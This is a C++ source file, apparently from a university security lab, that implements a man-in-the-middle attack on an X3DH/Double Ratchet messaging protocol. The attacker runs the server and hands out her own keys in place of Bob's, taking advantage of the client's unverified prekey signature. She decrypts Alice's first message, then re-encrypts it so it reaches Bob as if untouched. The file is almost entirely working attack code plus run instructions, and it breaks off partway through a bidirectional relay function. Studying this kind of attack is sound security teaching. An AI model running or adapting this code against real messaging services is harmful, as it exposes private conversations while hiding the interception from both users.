// attack2.cpp — Malicious server / MITM (key substitution), Phase 2.
//
// Role: Mallory IS the server. She speaks the full AS3 wire protocol
// (register/publish/fetch_bundle/send/poll with mailboxes) so Alice and Bob
// behave exactly as with the genuine server. The attack:
//
//   * When Alice fetches "bob"'s bundle, Mallory returns her OWN X25519 keys
//     (ik_dh / spk / opk) — the client does not verify spk_sig, so Alice
//     accepts them. Alice now runs X3DH against Mallory and believes it is Bob.
//   * On Alice's first frame (the one carrying the `init` block), Mallory runs
//     x3dh_respond with her private keys, derives the same session key, and
//     DECRYPTS Alice's plaintext.
//   * To keep both parties unaware, Mallory then runs x3dh_initiate against
//     Bob's REAL bundle (which she holds as the server), re-encrypts the
//     recovered plaintext, and delivers it to Bob. Bob decrypts it with his
//     real keys and sees a normal message from "alice".
//
// PHASE 2 SCOPE: prove recovery + transparent delivery for Alice's FIRST
// message. Later messages / the reverse direction / ratchet continuation are
// Phase 3. (For the Phase-2 test, have Alice send exactly one line.)
//
// Crypto: OpenSSL 3 (X25519, HKDF-SHA256, HMAC-SHA256, ChaCha20-Poly1305-IETF).
// Ed25519 is NOT needed — the client logs `SPK sig NOT verified`.
//
// Build:  make           (g++ ... -lssl -lcrypto)
// Run:    ./attack2 [--port 9000] [--victim bob] [--initiator alice] [-v]
//         then point the clients at this server:
//         docker compose run --rm bob   /client --server-addr host.docker.internal --port 9000
//         docker compose run --rm alice /client --server-addr host.docker.internal --port 9000

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <openssl/core_names.h>
#include <openssl/params.h>

// ---------------------------------------------------------------------------
// Config / globals
// ---------------------------------------------------------------------------
static int         g_port      = 9000;
static std::string g_victim    = "bob";     // whose bundle we substitute / session we MITM
static std::string g_initiator = "alice";   // who starts the session we read
static bool        g_verbose   = false;
static bool        g_full_mitm = true;       // Phase 3 (both directions); --phase2 forces single-shot

#define DIE(msg) do { std::fprintf(stderr, "[attack2] FATAL: %s\n", msg); std::exit(1); } while (0)

// ---------------------------------------------------------------------------
// Base64 (standard, padded)
// ---------------------------------------------------------------------------
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string b64_encode(const uint8_t* in, size_t n) {
    std::string out;
    out.reserve((n + 2) / 3 * 4);
    for (size_t i = 0; i < n; i += 3) {
        uint32_t v = in[i] << 16;
        int rem = (int)(n - i);
        if (rem > 1) v |= in[i + 1] << 8;
        if (rem > 2) v |= in[i + 2];
        out.push_back(B64[(v >> 18) & 63]);
        out.push_back(B64[(v >> 12) & 63]);
        out.push_back(rem > 1 ? B64[(v >> 6) & 63] : '=');
        out.push_back(rem > 2 ? B64[v & 63] : '=');
    }
    return out;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static std::vector<uint8_t> b64_decode(const std::string& s) {
    std::vector<uint8_t> out;
    int buf = 0, bits = 0;
    for (char c : s) {
        if (c == '=' || c == '\n' || c == '\r' || c == ' ') continue;
        int v = b64_val(c);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back((uint8_t)((buf >> bits) & 0xFF));
        }
    }
    return out;
}

// ---------------------------------------------------------------------------
// OpenSSL crypto helpers
// ---------------------------------------------------------------------------
static void x25519_keygen(uint8_t pub[32], uint8_t priv[32]) {
    EVP_PKEY* pkey = nullptr;
    EVP_PKEY_CTX* c = EVP_PKEY_CTX_new_id(EVP_PKEY_X25519, nullptr);
    if (!c || EVP_PKEY_keygen_init(c) <= 0 || EVP_PKEY_keygen(c, &pkey) <= 0) DIE("x25519 keygen");
    size_t l = 32;
    EVP_PKEY_get_raw_public_key(pkey, pub, &l);
    l = 32;
    EVP_PKEY_get_raw_private_key(pkey, priv, &l);
    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(c);
}

static bool x25519_dh(const uint8_t priv[32], const uint8_t peer[32], uint8_t out[32]) {
    EVP_PKEY* p = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, nullptr, priv, 32);
    EVP_PKEY* q = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, nullptr, peer, 32);
    EVP_PKEY_CTX* c = p ? EVP_PKEY_CTX_new(p, nullptr) : nullptr;
    size_t l = 32;
    bool ok = p && q && c &&
              EVP_PKEY_derive_init(c) > 0 &&
              EVP_PKEY_derive_set_peer(c, q) > 0 &&
              EVP_PKEY_derive(c, out, &l) > 0 && l == 32;
    if (c) EVP_PKEY_CTX_free(c);
    if (p) EVP_PKEY_free(p);
    if (q) EVP_PKEY_free(q);
    return ok;
}

static bool hkdf_sha256(const uint8_t* salt, size_t saltlen,
                        const uint8_t* ikm, size_t ikmlen,
                        const char* info, size_t infolen,
                        uint8_t* out, size_t outlen) {
    EVP_KDF* kdf = EVP_KDF_fetch(nullptr, "HKDF", nullptr);
    EVP_KDF_CTX* c = kdf ? EVP_KDF_CTX_new(kdf) : nullptr;
    char dig[] = "SHA256";
    OSSL_PARAM params[5];
    int i = 0;
    params[i++] = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST, dig, 0);
    params[i++] = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SALT, (void*)salt, saltlen);
    params[i++] = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_KEY, (void*)ikm, ikmlen);
    params[i++] = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_INFO, (void*)info, infolen);
    params[i++] = OSSL_PARAM_construct_end();
    bool ok = c && EVP_KDF_derive(c, out, outlen, params) > 0;
    if (c) EVP_KDF_CTX_free(c);
    if (kdf) EVP_KDF_free(kdf);
    return ok;
}

static void hmac_sha256(const uint8_t key[32], uint8_t byte, uint8_t out[32]) {
    unsigned int outl = 32;
    HMAC(EVP_sha256(), key, 32, &byte, 1, out, &outl);
}

// ChaCha20-Poly1305 IETF. ct = ciphertext||tag(16). nonce = 12 bytes.
static bool aead_decrypt(const uint8_t key[32], const uint8_t nonce[12],
                         const uint8_t* ct, size_t ctlen,
                         const uint8_t* ad, size_t adlen,
                         std::string& pt_out) {
    if (ctlen < 16) return false;
    size_t clen = ctlen - 16;
    const uint8_t* tag = ct + clen;
    EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
    if (!c) return false;
    std::vector<uint8_t> pt(clen);
    int len = 0;
    bool ok = EVP_DecryptInit_ex(c, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr) > 0 &&
              EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr) > 0 &&
              EVP_DecryptInit_ex(c, nullptr, nullptr, key, nonce) > 0;
    if (ok && adlen) ok = EVP_DecryptUpdate(c, nullptr, &len, ad, (int)adlen) > 0;
    if (ok) ok = EVP_DecryptUpdate(c, pt.data(), &len, ct, (int)clen) > 0;
    if (ok) ok = EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_TAG, 16, (void*)tag) > 0;
    int flen = 0;
    if (ok) ok = EVP_DecryptFinal_ex(c, pt.data() + len, &flen) > 0;
    EVP_CIPHER_CTX_free(c);
    if (ok) pt_out.assign((char*)pt.data(), clen);
    return ok;
}

static bool aead_encrypt(const uint8_t key[32], const uint8_t nonce[12],
                         const uint8_t* pt, size_t ptlen,
                         const uint8_t* ad, size_t adlen,
                         std::vector<uint8_t>& ct_out) {
    EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
    if (!c) return false;
    ct_out.resize(ptlen + 16);
    int len = 0;
    bool ok = EVP_EncryptInit_ex(c, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr) > 0 &&
              EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr) > 0 &&
              EVP_EncryptInit_ex(c, nullptr, nullptr, key, nonce) > 0;
    if (ok && adlen) ok = EVP_EncryptUpdate(c, nullptr, &len, ad, (int)adlen) > 0;
    if (ok) ok = EVP_EncryptUpdate(c, ct_out.data(), &len, pt, (int)ptlen) > 0;
    int flen = 0;
    if (ok) ok = EVP_EncryptFinal_ex(c, ct_out.data() + len, &flen) > 0;
    if (ok) ok = EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_GET_TAG, 16, ct_out.data() + ptlen) > 0;
    EVP_CIPHER_CTX_free(c);
    return ok;
}

// ---------------------------------------------------------------------------
// Minimal JSON reading (good enough for the lab's one-line frames)
// ---------------------------------------------------------------------------
static std::string j_str(const std::string& s, const std::string& key) {
    std::string pat = "\"" + key + "\":\"";
    size_t p = s.find(pat);
    if (p == std::string::npos) return "";
    p += pat.size();
    size_t q = s.find('"', p);
    if (q == std::string::npos) return "";
    return s.substr(p, q - p);
}

static long j_int(const std::string& s, const std::string& key, long def = -1) {
    std::string pat = "\"" + key + "\":";
    size_t p = s.find(pat);
    if (p == std::string::npos) return def;
    size_t b = p + pat.size();
    while (b < s.size() && s[b] == ' ') ++b;
    char* end = nullptr;
    long v = std::strtol(s.c_str() + b, &end, 10);
    if (end == s.c_str() + b) return def;
    return v;
}

// Return the "{...}" object value for key, brace-matched. "" if absent.
static std::string j_obj(const std::string& s, const std::string& key) {
    std::string pat = "\"" + key + "\":";
    size_t p = s.find(pat);
    if (p == std::string::npos) return "";
    size_t b = s.find('{', p + pat.size());
    if (b == std::string::npos) return "";
    int depth = 0;
    for (size_t i = b; i < s.size(); ++i) {
        if (s[i] == '{') ++depth;
        else if (s[i] == '}') { if (--depth == 0) return s.substr(b, i - b + 1); }
    }
    return "";
}

static bool decode32(const std::string& b64, uint8_t out[32]) {
    auto v = b64_decode(b64);
    if (v.size() != 32) return false;
    memcpy(out, v.data(), 32);
    return true;
}

// --- Associated-data format discovery -------------------------------------
// The protocol doc leaves serialize(header) and the raw layout of st.AD
// under-specified, so we discover the Go client's exact convention empirically
// on the first message, then reuse it for every leg.
enum HMode { H_COMPACT, H_SPACED, H_PNN_DH, H_WIRE, H_EMPTY, H_COUNT };
enum PMode { P_DH_RAW, P_DH_B64, P_SIG_RAW, P_SIG_B64, P_DH_RAW_REV, P_EMPTY, P_COUNT };

static const char* HMODE_NAME[] = {"compact", "spaced", "pn,n,dh", "wire+init", "empty"};
static const char* PMODE_NAME[] = {"dh_raw", "dh_b64", "sig_raw", "sig_b64", "dh_raw_rev", "none"};

static int g_hmode = H_COMPACT;   // discovered on first message
static int g_pmode = P_DH_RAW;
static bool g_fmt_known = false;

static std::string build_header_ad(int hmode, const std::string& dh_b64, long pn, long n,
                                   const std::string& wire_with_init) {
    switch (hmode) {
        case H_COMPACT: return "{\"dh\":\"" + dh_b64 + "\",\"pn\":" + std::to_string(pn) +
                               ",\"n\":" + std::to_string(n) + "}";
        case H_SPACED:  return "{\"dh\": \"" + dh_b64 + "\", \"pn\": " + std::to_string(pn) +
                               ", \"n\": " + std::to_string(n) + "}";
        case H_PNN_DH:  return "{\"pn\":" + std::to_string(pn) + ",\"n\":" + std::to_string(n) +
                               ",\"dh\":\"" + dh_b64 + "\"}";
        case H_WIRE:    return wire_with_init;
        case H_EMPTY:   return "";
    }
    return "";
}

// prefix = st.AD, always ordered initiator-IK then responder-IK (same on both roles).
static std::string build_prefix_ad(int pmode,
                                   const uint8_t* ini_dh, const uint8_t* ini_sig,
                                   const uint8_t* res_dh, const uint8_t* res_sig) {
    auto raw = [](const uint8_t* k) { return std::string((const char*)k, 32); };
    auto enc = [](const uint8_t* k) { return b64_encode(k, 32); };
    switch (pmode) {
        case P_DH_RAW:     return raw(ini_dh) + raw(res_dh);
        case P_DH_B64:     return enc(ini_dh) + enc(res_dh);
        case P_SIG_RAW:    return raw(ini_sig) + raw(res_sig);
        case P_SIG_B64:    return enc(ini_sig) + enc(res_sig);
        case P_DH_RAW_REV: return raw(res_dh) + raw(ini_dh);
        case P_EMPTY:      return "";
    }
    return "";
}

// ---------------------------------------------------------------------------
// Double Ratchet state (minimal: in-order, no skipped-key store — Phase 2)
// ---------------------------------------------------------------------------
struct Ratchet {
    uint8_t RK[32]{};
    uint8_t DHs_priv[32]{}, DHs_pub[32]{};
    bool    has_DHr = false; uint8_t DHr[32]{};
    uint8_t CKs[32]{}; bool has_CKs = false;
    uint8_t CKr[32]{}; bool has_CKr = false;
    long    Ns = 0, Nr = 0, PN = 0;
    std::string AD;   // raw associated-data bytes (64)
};

static void kdf_rk(const uint8_t rk[32], const uint8_t dh_out[32],
                   uint8_t new_rk[32], uint8_t new_ck[32]) {
    uint8_t out[64];
    if (!hkdf_sha256(rk, 32, dh_out, 32, "AS3_ROOT", 8, out, 64)) DIE("kdf_rk");
    memcpy(new_rk, out, 32);
    memcpy(new_ck, out + 32, 32);
}

static void kdf_ck(const uint8_t ck[32], uint8_t mk[32], uint8_t nck[32]) {
    hmac_sha256(ck, 0x01, mk);
    hmac_sha256(ck, 0x02, nck);
}

// ratchet_init_sender: DHr = their SPK pub; take one root step into CKs.
static void init_sender(Ratchet& st, const uint8_t sk[32], const uint8_t their_spk[32],
                        const std::string& ad) {
    memcpy(st.RK, sk, 32);
    memcpy(st.DHr, their_spk, 32); st.has_DHr = true;
    st.AD = ad;
    x25519_keygen(st.DHs_pub, st.DHs_priv);
    uint8_t dh_out[32];
    if (!x25519_dh(st.DHs_priv, st.DHr, dh_out)) DIE("init_sender dh");
    kdf_rk(st.RK, dh_out, st.RK, st.CKs); st.has_CKs = true;
}

// ratchet_init_receiver: keep my SPK pair as initial ratchet key; no step yet.
static void init_receiver(Ratchet& st, const uint8_t sk[32],
                          const uint8_t my_spk_pub[32], const uint8_t my_spk_priv[32],
                          const std::string& ad) {
    memcpy(st.RK, sk, 32);
    memcpy(st.DHs_pub, my_spk_pub, 32);
    memcpy(st.DHs_priv, my_spk_priv, 32);
    st.has_DHr = false;
    st.AD = ad;
}

static void dh_ratchet(Ratchet& st, const uint8_t dh_pub[32]) {
    st.PN = st.Ns; st.Ns = 0; st.Nr = 0;
    memcpy(st.DHr, dh_pub, 32); st.has_DHr = true;
    uint8_t dh_out[32];
    if (!x25519_dh(st.DHs_priv, st.DHr, dh_out)) DIE("dh_ratchet recv dh");
    kdf_rk(st.RK, dh_out, st.RK, st.CKr); st.has_CKr = true;
    x25519_keygen(st.DHs_pub, st.DHs_priv);
    if (!x25519_dh(st.DHs_priv, st.DHr, dh_out)) DIE("dh_ratchet send dh");
    kdf_rk(st.RK, dh_out, st.RK, st.CKs); st.has_CKs = true;
}

// Compute the message key for the FIRST received message (n=0,pn=0) without
// consuming state — used by the AD-format discovery sweep.
static void first_recv_mk(const uint8_t sk[32], const uint8_t my_spk_pub[32],
                          const uint8_t my_spk_priv[32], const uint8_t dh_pub[32],
                          uint8_t mk_out[32]) {
    Ratchet st;
    init_receiver(st, sk, my_spk_pub, my_spk_priv, "");
    dh_ratchet(st, dh_pub);
    uint8_t nck[32];
    kdf_ck(st.CKr, mk_out, nck);
}

// Decrypt one received frame (in-order; handles the first-message DH ratchet).
static bool ratchet_decrypt(Ratchet& st, const uint8_t dh_pub[32], long pn, long n,
                            const std::string& dh_b64, const uint8_t* ct, size_t ctlen,
                            std::string& pt_out) {
    if (!st.has_DHr || memcmp(dh_pub, st.DHr, 32) != 0) {
        // (skip to pn on the old chain is a no-op here: CKr absent on first msg)
        (void)pn;
        dh_ratchet(st, dh_pub);
    }
    while (st.Nr < n) {           // catch up to this message's number
        uint8_t mk[32];
        kdf_ck(st.CKr, mk, st.CKr);
        st.Nr++;
    }
    uint8_t mk[32];
    kdf_ck(st.CKr, mk, st.CKr);
    st.Nr++;
    uint8_t nonce[12] = {0};
    std::string ad = st.AD + build_header_ad(g_hmode, dh_b64, pn, n, "");
    return aead_decrypt(mk, nonce, ct, ctlen,
                        (const uint8_t*)ad.data(), ad.size(), pt_out);
}

// Encrypt one message on the sending chain. Returns header dh b64 + ct bytes.
static void ratchet_encrypt(Ratchet& st, const std::string& pt,
                            std::string& dh_b64_out, long& pn_out, long& n_out,
                            std::vector<uint8_t>& ct_out) {
    uint8_t mk[32];
    kdf_ck(st.CKs, mk, st.CKs);
    dh_b64_out = b64_encode(st.DHs_pub, 32);
    pn_out = st.PN; n_out = st.Ns;
    st.Ns++;
    uint8_t nonce[12] = {0};
    std::string ad = st.AD + build_header_ad(g_hmode, dh_b64_out, pn_out, n_out, "");
    if (!aead_encrypt(mk, nonce, (const uint8_t*)pt.data(), pt.size(),
                      (const uint8_t*)ad.data(), ad.size(), ct_out))
        DIE("ratchet_encrypt");
}

// ---------------------------------------------------------------------------
// Mallory's substituted key material (impersonating the victim to the initiator)
// ---------------------------------------------------------------------------
struct KeyPair { uint8_t pub[32], priv[32]; };

static KeyPair M_ik;        // Mallory identity DH
static KeyPair M_spk;       // Mallory signed prekey (served as victim's SPK)
static KeyPair M_opk;       // Mallory one-time prekey (served as victim's OPK)
static uint8_t M_ik_sig[32];   // bogus (client does not verify)
static uint8_t M_spk_sig[64];  // bogus

static void gen_mallory_keys() {
    x25519_keygen(M_ik.pub, M_ik.priv);
    x25519_keygen(M_spk.pub, M_spk.priv);
    x25519_keygen(M_opk.pub, M_opk.priv);
    RAND_bytes(M_ik_sig, 32);
    RAND_bytes(M_spk_sig, 64);
}

static std::string mallory_bundle_for(const std::string& user) {
    return "{\"user\":\"" + user + "\","
           "\"ik_sig\":\"" + b64_encode(M_ik_sig, 32) + "\","
           "\"ik_dh\":\""  + b64_encode(M_ik.pub, 32) + "\","
           "\"spk\":\""    + b64_encode(M_spk.pub, 32) + "\","
           "\"spk_sig\":\"" + b64_encode(M_spk_sig, 64) + "\","
           "\"opk\":\""    + b64_encode(M_opk.pub, 32) + "\","
           "\"opk_id\":1}";
}

// ---------------------------------------------------------------------------
// Shared server state
// ---------------------------------------------------------------------------
static std::mutex g_mu;
static std::map<std::string, std::string>            g_bundles;   // user -> published bundle obj
static std::map<std::string, std::vector<std::string>> g_mailbox; // user -> queued frame objects
static bool    g_victim_bundle_seen = false;
static uint8_t g_victim_ik_dh[32], g_victim_spk[32], g_victim_ik_sig[32]; // real victim publics
static bool    g_mitm_done = false;                               // Phase 2: first message only

// ---------------------------------------------------------------------------
// Shared X3DH + discovery helpers (used by both the Phase 2 single-shot path
// and the Phase 3 bidirectional relay).
// ---------------------------------------------------------------------------

// Mallory as RESPONDER (impersonating the victim to the initiator): derive the
// shared secret from the initiator's ik_dh + ek using Mallory's substituted
// private keys. DH4 (one-time prekey) is included iff opk_id != 0.
static void x3dh_respond(const uint8_t ik_dh_A[32], const uint8_t ek_A[32],
                         long opk_id, uint8_t sk[32]) {
    uint8_t dh1[32], dh2[32], dh3[32], dh4[32];
    x25519_dh(M_spk.priv, ik_dh_A, dh1);   // DH1 = DH(SPK_M, IK_A)
    x25519_dh(M_ik.priv,  ek_A,    dh2);   // DH2 = DH(IK_M, EK_A)
    x25519_dh(M_spk.priv, ek_A,    dh3);   // DH3 = DH(SPK_M, EK_A)
    std::vector<uint8_t> ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1, dh1 + 32);
    ikm.insert(ikm.end(), dh2, dh2 + 32);
    ikm.insert(ikm.end(), dh3, dh3 + 32);
    if (opk_id != 0) { x25519_dh(M_opk.priv, ek_A, dh4); ikm.insert(ikm.end(), dh4, dh4 + 32); }
    uint8_t zeros[32] = {0};
    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk, 32);
}

// Mallory as INITIATOR toward the real victim (Bob): fresh ephemeral key, derive
// the shared secret against the victim's REAL published bundle (no OPK).
static void x3dh_initiate_to_victim(uint8_t ek_pub[32], uint8_t ek_priv[32], uint8_t sk[32]) {
    x25519_keygen(ek_pub, ek_priv);
    uint8_t v1[32], v2[32], v3[32];
    x25519_dh(M_ik.priv, g_victim_spk,   v1);   // DH1 = DH(IK_M, SPK_B)
    x25519_dh(ek_priv,   g_victim_ik_dh, v2);   // DH2 = DH(EK_M, IK_B)
    x25519_dh(ek_priv,   g_victim_spk,   v3);   // DH3 = DH(EK_M, SPK_B)
    std::vector<uint8_t> ikm(32, 0xFF);
    ikm.insert(ikm.end(), v1, v1 + 32);
    ikm.insert(ikm.end(), v2, v2 + 32);
    ikm.insert(ikm.end(), v3, v3 + 32);
    uint8_t zeros[32] = {0};
    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk, 32);
}

// Brute-force the Go client's AEAD associated-data convention against the first
// message key. On success sets g_pmode/g_hmode/g_fmt_known and returns the
// recovered plaintext. (This is the discovery mechanism documented in the
// README / Report §5.C — kept so it can be shown in the viva.)
static bool discover_ad(const uint8_t mk[32], const std::vector<uint8_t>& ctv,
                        const uint8_t ik_dh_A[32], const uint8_t ik_sig_A[32],
                        const std::string& dh_b64, long pn, long n,
                        const std::string& wire_header, std::string& plaintext) {
    uint8_t nonce[12] = {0};
    for (int pm = 0; pm < P_COUNT; ++pm) {
        std::string prefix = build_prefix_ad(pm, ik_dh_A, ik_sig_A, M_ik.pub, M_ik_sig);
        for (int hm = 0; hm < H_COUNT; ++hm) {
            std::string ad = prefix + build_header_ad(hm, dh_b64, pn, n, wire_header);
            if (aead_decrypt(mk, nonce, ctv.data(), ctv.size(),
                             (const uint8_t*)ad.data(), ad.size(), plaintext)) {
                g_pmode = pm; g_hmode = hm; g_fmt_known = true;
                std::printf("[attack2] AD format discovered: prefix=%s  header=%s\n",
                            PMODE_NAME[pm], HMODE_NAME[hm]);
                return true;
            }
        }
    }
    return false;
}

// ---------------------------------------------------------------------------
// MITM core: on Alice's first frame, decrypt it and re-encrypt toward Bob.
// Returns the re-encrypted frame object to queue for the victim, or "" on skip.
// ---------------------------------------------------------------------------
static std::string mitm_first_frame(const std::string& frame) {
    std::string header = j_obj(frame, "header");
    std::string init   = j_obj(header, "init");
    if (init.empty()) return "";   // not a session-initiating frame

    // --- parse Alice's init + header + ct ---
    uint8_t ik_dh_A[32], ik_sig_A[32], ek_A[32], dh_A[32];
    std::string dh_b64 = j_str(header, "dh");
    long pn = j_int(header, "pn", 0), n = j_int(header, "n", 0);
    long opk_id = j_int(init, "opk_id", 0);
    if (!decode32(j_str(init, "ik_dh"), ik_dh_A) ||
        !decode32(j_str(init, "ek"), ek_A) ||
        !decode32(dh_b64, dh_A)) { std::fprintf(stderr, "[attack2] init parse fail\n"); return ""; }
    decode32(j_str(init, "ik_sig"), ik_sig_A);
    auto ctv = b64_decode(j_str(frame, "ct"));

    // --- x3dh_respond as the victim, using Mallory's private keys ---
    uint8_t dh1[32], dh2[32], dh3[32], dh4[32];
    x25519_dh(M_spk.priv, ik_dh_A, dh1);   // mirror DH1
    x25519_dh(M_ik.priv,  ek_A,    dh2);   // mirror DH2
    x25519_dh(M_spk.priv, ek_A,    dh3);   // mirror DH3
    std::vector<uint8_t> ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1, dh1 + 32);
    ikm.insert(ikm.end(), dh2, dh2 + 32);
    ikm.insert(ikm.end(), dh3, dh3 + 32);
    if (opk_id != 0) { x25519_dh(M_opk.priv, ek_A, dh4); ikm.insert(ikm.end(), dh4, dh4 + 32); }
    uint8_t zeros[32] = {0}, sk_AM[32];
    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk_AM, 32);

    // message key for the first frame (n=0) is fixed once sk is fixed
    uint8_t mk[32];
    first_recv_mk(sk_AM, M_spk.pub, M_spk.priv, dh_A, mk);
    uint8_t nonce[12] = {0};

    // --- discover the Go client's AD/serialize convention (once) ---
    std::string plaintext;
    bool found = false;
    for (int pm = 0; pm < P_COUNT && !found; ++pm) {
        std::string prefix = build_prefix_ad(pm, ik_dh_A, ik_sig_A, M_ik.pub, M_ik_sig);
        for (int hm = 0; hm < H_COUNT && !found; ++hm) {
            std::string ad = prefix + build_header_ad(hm, dh_b64, pn, n, header);
            if (aead_decrypt(mk, nonce, ctv.data(), ctv.size(),
                             (const uint8_t*)ad.data(), ad.size(), plaintext)) {
                g_pmode = pm; g_hmode = hm; g_fmt_known = true; found = true;
                std::printf("[attack2] AD format discovered: prefix=%s  header=%s\n",
                            PMODE_NAME[pm], HMODE_NAME[hm]);
            }
        }
    }
    if (!found) {
        std::fprintf(stderr, "[attack2] DECRYPT FAILED — no AD variant matched "
                     "(SK/ratchet derivation likely differs from the client)\n");
        return "";
    }
    std::printf("\n========================================================\n");
    std::printf("[attack2] RECOVERED PLAINTEXT  %s -> %s :  \"%s\"\n",
                g_initiator.c_str(), g_victim.c_str(), plaintext.c_str());
    std::printf("========================================================\n\n");
    std::fflush(stdout);

    // --- re-encrypt toward the real victim so delivery looks normal ---
    if (!g_victim_bundle_seen) {
        std::fprintf(stderr, "[attack2] victim bundle not yet published — cannot forward\n");
        return "";
    }
    uint8_t ek_M_pub[32], ek_M_priv[32];
    x25519_keygen(ek_M_pub, ek_M_priv);
    uint8_t v1[32], v2[32], v3[32];
    x25519_dh(M_ik.priv,  g_victim_spk,   v1);   // DH1 = DH(IK_M, SPK_B)
    x25519_dh(ek_M_priv,  g_victim_ik_dh, v2);   // DH2 = DH(EK_M, IK_B)
    x25519_dh(ek_M_priv,  g_victim_spk,   v3);   // DH3 = DH(EK_M, SPK_B)
    std::vector<uint8_t> ikm2(32, 0xFF);
    ikm2.insert(ikm2.end(), v1, v1 + 32);
    ikm2.insert(ikm2.end(), v2, v2 + 32);
    ikm2.insert(ikm2.end(), v3, v3 + 32);      // opk_id = 0 toward Bob (no OPK)
    uint8_t sk_MB[32];
    hkdf_sha256(zeros, 32, ikm2.data(), ikm2.size(), "AS3_X3DH", 8, sk_MB, 32);

    // Set up the Mallory->Bob sending ratchet and take the first message key.
    Ratchet tx;
    init_sender(tx, sk_MB, g_victim_spk, "");
    uint8_t mk_MB[32], nck[32];
    kdf_ck(tx.CKs, mk_MB, nck);
    std::string out_dh_b64 = b64_encode(tx.DHs_pub, 32);
    long out_pn = tx.PN, out_n = tx.Ns;   // 0, 0

    std::string init_MB =
        "{\"ik_sig\":\"" + b64_encode(M_ik_sig, 32) + "\","
        "\"ik_dh\":\""  + b64_encode(M_ik.pub, 32) + "\","
        "\"ek\":\""     + b64_encode(ek_M_pub, 32) + "\","
        "\"opk_id\":0}";
    std::string header_MB =
        "{\"dh\":\"" + out_dh_b64 + "\",\"pn\":" + std::to_string(out_pn) +
        ",\"n\":" + std::to_string(out_n) + ",\"init\":" + init_MB + "}";

    // AD in the SAME convention we just discovered (Mallory=initiator, Bob=responder).
    std::string ad_MB = build_prefix_ad(g_pmode, M_ik.pub, M_ik_sig,
                                        g_victim_ik_dh, g_victim_ik_sig) +
                        build_header_ad(g_hmode, out_dh_b64, out_pn, out_n, header_MB);
    std::vector<uint8_t> out_ct;
    if (!aead_encrypt(mk_MB, nonce, (const uint8_t*)plaintext.data(), plaintext.size(),
                      (const uint8_t*)ad_MB.data(), ad_MB.size(), out_ct))
        DIE("forward encrypt");

    std::string frame_out =
        "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":" +
        header_MB + ",\"ct\":\"" + b64_encode(out_ct.data(), out_ct.size()) + "\"}";

    std::printf("[attack2] re-encrypted for %s and delivered (transparent MITM)\n\n",
                g_victim.c_str());
    std::fflush(stdout);
    return frame_out;
}

// ---------------------------------------------------------------------------
// Phase 3: full bidirectional MITM. Mallory holds two PERSISTENT ratchet
// sessions and relays every frame of the conversation, reading both directions:
//
//   g_AM : Mallory as RESPONDER to Alice  (recv chain = from Alice, send = to Alice)
//   g_MB : Mallory as INITIATOR to Bob    (send chain  = to Bob,    recv  = from Bob)
//
//   Alice -> Bob : decrypt on g_AM, re-encrypt on g_MB, deliver to Bob
//   Bob   -> Alice: decrypt on g_MB, re-encrypt on g_AM, deliver to Alice
//
// Each ratchet_decrypt/ratchet_encrypt advances its own chain and performs the
// DH-ratchet step when the peer's `dh` changes, so the conversation keeps
// flowing (and stays readable) across both parties' ratchet turns.
// ---------------------------------------------------------------------------
static Ratchet     g_AM;                       // Mallory <-> Alice (Mallory responder)
static Ratchet     g_MB;                       // Mallory <-> Bob   (Mallory initiator)
static bool        g_AM_up = false, g_MB_up = false;
static std::string g_init_block_MB;            // init block to attach to Mallory's FIRST frame to Bob
static long        g_n_AtoB = 0, g_n_BtoA = 0; // recovered-message counters (for logging)

// Alice -> Bob : recover plaintext on g_AM, re-encrypt on g_MB, forward to Bob.
static std::string relay_A_to_B(const std::string& frame) {
    std::string header = j_obj(frame, "header");
    std::string dh_b64 = j_str(header, "dh");
    long pn = j_int(header, "pn", 0), n = j_int(header, "n", 0);
    uint8_t dh_A[32];
    if (!decode32(dh_b64, dh_A)) { std::fprintf(stderr, "[attack2] A->B dh parse fail\n"); return ""; }
    auto ctv = b64_decode(j_str(frame, "ct"));

    if (!g_AM_up) {
        std::string init = j_obj(header, "init");
        if (init.empty()) { std::fprintf(stderr, "[attack2] first A->B frame lacks init\n"); return ""; }
        uint8_t ik_dh_A[32], ik_sig_A[32], ek_A[32];
        if (!decode32(j_str(init, "ik_dh"), ik_dh_A) || !decode32(j_str(init, "ek"), ek_A)) {
            std::fprintf(stderr, "[attack2] init parse fail\n"); return "";
        }
        decode32(j_str(init, "ik_sig"), ik_sig_A);
        long opk_id = j_int(init, "opk_id", 0);

        uint8_t sk_AM[32];
